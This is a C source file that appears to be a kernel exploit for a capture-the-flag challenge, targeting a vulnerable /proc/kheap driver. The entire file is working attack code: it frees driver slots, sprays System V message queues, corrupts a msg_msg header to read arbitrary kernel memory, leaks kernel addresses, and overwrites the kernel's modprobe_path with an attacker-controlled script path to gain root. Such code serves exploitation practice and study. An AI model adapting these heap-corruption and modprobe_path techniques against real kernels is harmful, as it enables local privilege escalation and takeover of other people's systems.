#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/sendfile.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#define MSG_COPY                    040000  /* copy (not remove) all queue messages */

int do_print = 0x5702;
int pre_flag = 0x5704;
int cp_user = 0x5700;
int kefree = 0x5703;
int cp_from_user = 0x5701;

unsigned long modprobe_path_addr = 0xffffffffbdf3f4c0;
unsigned long leak_addr =          0xffffffffbc6ef2b0;
unsigned long modpath[] ={
0x6f6d2f6e6962732f, 0x000065626f727064,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000003200000000, 0xffffffff82b3f5c8,
0xffffffff82b3f5c8, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0xffffffff82b3f5f0, 0xffffffff82b3f5f0,
0x0000000000000001, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0xffffffff826bdd4b, 0xffffffff82b3f6a0,
0x000001a400000004, 0x0000000000000000,
0xffffffff811323e0, 0x0000000000000000,
0xffffffff8220e3e0, 0xffffffff8220e3e4,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000001, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000
};


typedef struct _kheap_req_t // sizeof=0x10
{                                       // XREF: kheap_ioctl/r
    void *ubuf;                         // XREF: kheap_ioctl+78/r
                                        // kheap_ioctl+FA/r
    size_t size;                        // XREF: kheap_ioctl+73/r
                                        // kheap_ioctl:loc_135/r
}kheap_req_t;

typedef struct _msgbuf_t {
    long mtype;
    char buf[0x10000];
}msgbuf_t;

kheap_req_t kheap_req;

char ezblock() {
    puts("blocking! intput c continue");
    char a;
    read(0, &a, 1);
    return a;
}

unsigned long print_value(unsigned long *ptr, int index)
{

    printf("[%2d] 0x%llx\n",index, ptr[index]);

    printf("\n");
    return ptr[index];
}

int open_fd()
{
    int fd = open("/proc/kheap", 0);
    return fd;
}

void free_slot(int fd)
{
    int ret = ioctl(fd, kefree, &kheap_req);
    printf("free %d\n", ret);
}

void read_slot(int fd)
{
    int ret = ioctl(fd, cp_user, &kheap_req);
    printf("read %d\n", ret);
}

void cpy_flag(int fd)
{
    int ret = ioctl(fd, pre_flag, &kheap_req);
    printf("cpy_flag %d\n", ret);
}

void write_slot(int fd)
{
    int ret = ioctl(fd, cp_from_user, &kheap_req);
    printf("write %d\n", ret);
}

typedef struct _msg_msg{
    unsigned long next;
    unsigned long prev;
    long m_type;
    size_t m_ts;
    unsigned long msgseg;
    void *security;
}msg_msg;

char buf [1024];
msg_msg msg_buf;
unsigned long pnext = 0;
unsigned long pprev = 0;

void arb_read(int fd_1, int msq_id, msgbuf_t* msgbuf, unsigned long addr)
{
    msg_buf.next = pnext;
    msg_buf.prev = pprev;
    msg_buf.m_type = 0x1;
    msg_buf.m_ts = 0x1f00;
    msg_buf.msgseg = addr;
    memcpy(buf, &msg_buf, sizeof(msg_buf));

    write_slot(fd_1);

    if (msgrcv(msq_id, msgbuf, 0x2000, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY) < 0) {
        perror ("MSGRCV bad stuff happened!");
    }
    printf("print kheap data\n");
    for (int i = 0; i < 0x1200/8;i++)
    {
        if (((unsigned long *)msgbuf->buf)[i] != 0)
            printf("0x%x: 0x%llx\n",i*8, ((unsigned long *)msgbuf->buf)[i]);
    }
    printf("print kheap data end\n");
}

void free_block(int fd_1, int msq_id, msgbuf_t* msgbuf, unsigned long addr)
{
    msg_buf.next = pnext;
    msg_buf.prev = pprev;
    msg_buf.m_type = 0x1;
    msg_buf.m_ts = 0x1f00;
    msg_buf.msgseg = addr;
    memcpy(buf, &msg_buf, sizeof(msg_buf));

    write_slot(fd_1);

    if (msgrcv(msq_id, msgbuf, 0x2000, 0, 0) < 0) {
        perror ("MSGRCV bad stuff happened!");
    }
    printf("print kheap data\n");
    for (int i = 0; i < 0x1200/8;i++)
    {
        if (((unsigned long *)msgbuf->buf)[i] != 0)
            printf("0x%x: 0x%llx\n",i*8, ((unsigned long *)msgbuf->buf)[i]);
    }
    printf("print kheap data end\n");
}

void modify_modpath(unsigned long leak_ker)
{
    modpath[33] = leak_ker + (0xffffffff82b3f5c8 - 0xffffffff812cc9d0);
    modpath[34] = leak_ker + (0xffffffff82b3f5c8 - 0xffffffff812cc9d0);
    modpath[38] = leak_ker + (0xffffffff82b3f5f0 - 0xffffffff812cc9d0);
    modpath[39] = leak_ker + (0xffffffff82b3f5f0 - 0xffffffff812cc9d0);

    modpath[44] = leak_ker + (0xffffffff826bdd4b - 0xffffffff812cc9d0);
    modpath[45] = leak_ker + (0xffffffff82b3f6a0 - 0xffffffff812cc9d0);
    modpath[48] = leak_ker - (0xffffffff812cc9d0 - 0xffffffff811323e0);
    modpath[50] = leak_ker + (0xffffffff8220e3e0 - 0xffffffff812cc9d0);
    modpath[51] = leak_ker + (0xffffffff8220e3e4 - 0xffffffff812cc9d0);
}

int main()
{

    unsigned long do_print_addr = 0;
    int fd_save = -1;

    int fds[0x100] = {0};
    for(int i = 0; i < 0x100;i++){
        fds[i] = open("/proc/self/stat",0);
    }

    kheap_req.ubuf = buf;
    kheap_req.size = 0x1d0;

    unsigned long leak[2];
    memcpy(buf, "AAAAAAA", 8);
    // *(unsigned long *)(buf + 0x1f8) = 0xffffffff810b8bb0;

    int fd_1 = open_fd();
    int fd_2 = open_fd();
    int fd_3 = open_fd();

    free_slot(fd_3);
    free_slot(fd_2);
    free_slot(fd_1);
    size_t target_cachesize = 128;
    size_t msgsz = target_cachesize - 0x30;
    msgbuf_t* msgbuf = calloc(1, sizeof(msgbuf_t));
    puts("\nBEFORE creating messages\n");
    ezblock();

    key_t key1 = ftok("/home/hacker/1", 2);
    if(key1 == -1)
    {
        perror("ftok1 bad stuff happened!");
        exit(1);
    }
    key_t key2 = ftok("/home/hacker/2", 2);
    if(key2 == -1)
    {
        perror("ftok2 bad stuff happened!");
        exit(1);
    }
    // key_t key3 = ftok("/3", 2);
    int msq_id1 = msgget(key1, 0666 | IPC_CREAT);
    int msq_id2 = msgget(key2, 0666 | IPC_CREAT);

    memset(msgbuf->buf, 0, 0x10000);
    msgbuf->mtype = 1;
    memset(msgbuf->buf, 0, 0x10000);
    memset(msgbuf->buf, 1, 0x100);
    if (msgsnd(msq_id1, msgbuf, 0x200 - 0x30, 0) < 0)
    {
        perror("MSGSND bad stuff happened!");
        exit(1);
    }

    for (int i = 0; i < 4;i++)
    {
        msgbuf->mtype = 1;
        memset(msgbuf->buf, 0, 0x10000);
        memset(msgbuf->buf, i+2, 0x100);
        if (msgsnd(msq_id2, msgbuf, 0x200 - 0x30, 0) < 0) {
            perror ("MSGSND bad stuff happened!");
            exit(1);
        }
    }

    msgbuf->mtype = 1;
    memset(msgbuf->buf, 0, 0x10000);
    memset(msgbuf->buf, 6, 0x100);
    memset(&(msgbuf->buf[0xfd0]), 6, 8);
    if (msgsnd(msq_id2, msgbuf, 0xfd0 + 0x18, 0) < 0)
    {
        perror("MSGSND bad stuff happened! 3");
        exit(1);
    }

    kheap_req.size = 0x28;
    // set buf to be ???
    // Recreate message header to change size
    memset (buf, 0x01, 1024);
    // uint64_t *m_ts_addr = (((uint64_t *) (buf)) + 3);
    // *m_ts_addr = 0x800;

    memset(&msg_buf, 0, sizeof(msg_buf));
    msg_buf.m_type = 0x1;
    msg_buf.m_ts=0xfd0;
    memcpy(buf, &msg_buf, sizeof(msg_buf));

    ezblock();
    write_slot(fd_1);
    //ioctl(fd_1, 0x5701, &req);

    if (msgrcv(msq_id1, msgbuf, 0x1000, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY) < 0) {
        perror ("MSGRCV bad stuff happened!");
    }
    printf("print kheap data\n");
    for (int i = 0; i < 0x800/8;i++)
    {
        if (((unsigned long *)msgbuf->buf)[i] != 0)
            printf("0x%x: 0x%llx\n",i*8, ((unsigned long *)msgbuf->buf)[i]);
    }
    printf("print kheap data end\n");



    msgbuf->mtype = 1;
    memset(msgbuf->buf, 0x00, 0x10000);
    unsigned long addr;

    while (true)
    {
        char c = ezblock();
        if (c == 'c')
        {
            printf("addr: ");
            scanf("%llx", &addr);
            arb_read(fd_1, msq_id1, msgbuf, addr);
        }
        else{
            break;
        }

    }


    //free 2, 3  free后的数据地址3 + 0x100 -> 2
    if (msgrcv(msq_id2, msgbuf, 0x2000, 0, 0) < 0) {
        perror ("MSGRCV bad stuff happened!");
    }
    
    if (msgrcv(msq_id2, msgbuf, 0x2000, 0, 0) < 0) {
        perror ("MSGRCV bad stuff happened!");
    }

    msgbuf->mtype = 1;
    memset(msgbuf->buf, 0x00, 0x10000);
    while (true)
    {
        char c = ezblock();
        if (c == 'c')
        {
            printf("addr: ");
            scanf("%llx", &addr);
            arb_read(fd_1, msq_id1, msgbuf, addr);
        }
        else{
            break;
        }

    }

    printf("input single_start addr: ");
    unsigned long single_start_addr;
    scanf("%llx", &single_start_addr);
    unsigned long modpath_addr = 0xffffffff82b3f4c0 - 0xffffffff812cc9d0 + single_start_addr;
    printf("modpath_addr : %llx\n", modpath_addr);
    kheap_req.size = 0x1c0;
    memcpy(kheap_req.ubuf, modpath, sizeof(modpath));
    printf("Input next_block: ");
    unsigned long next_block = 0;
    scanf("%llx", &next_block);
    ((unsigned long *)(kheap_req.ubuf))[0x100/8] = next_block;
    write_slot(fd_3);
    fd_3 = open_fd();
    fd_2 = open_fd();
    kheap_req.size = 0x1c0;
    modify_modpath(single_start_addr);
    memcpy(kheap_req.ubuf, modpath, sizeof(modpath));
    memcpy(kheap_req.ubuf, "/home/hacker/a", 15);
    write_slot(fd_2);
    printf("pause\n");
    getchar();
    getchar();
    printf("exit\n");
    return 0;
}